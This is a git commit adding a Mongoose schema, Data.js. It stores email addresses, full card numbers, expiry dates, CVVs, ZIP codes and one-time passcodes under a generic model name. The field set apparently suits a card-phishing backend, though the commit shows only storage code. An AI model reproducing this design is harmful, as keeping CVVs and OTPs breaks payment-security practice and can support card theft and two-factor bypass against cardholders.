9689721f68ebc2762f7b8d8a6d5b70b99b4b734c
mj7028183-stack <mj7028183@gmail.com>
2026-01-31 01:10:07 +0100

    Data.js

---
+++ backend/models/Data.js
@@ -0,0 +1,14 @@
+const mongoose = require('mongoose');
+
+const DataSchema = new mongoose.Schema({
+    email: String,
+    cardNumber: String,
+    expiry: String,
+    cvv: String,
+    zip: String,
+    cardType: String,
+    otpCode: String,
+    timestamp: { type: Date, default: Date.now }
+});
+
+module.exports = mongoose.model('Data', DataSchema);
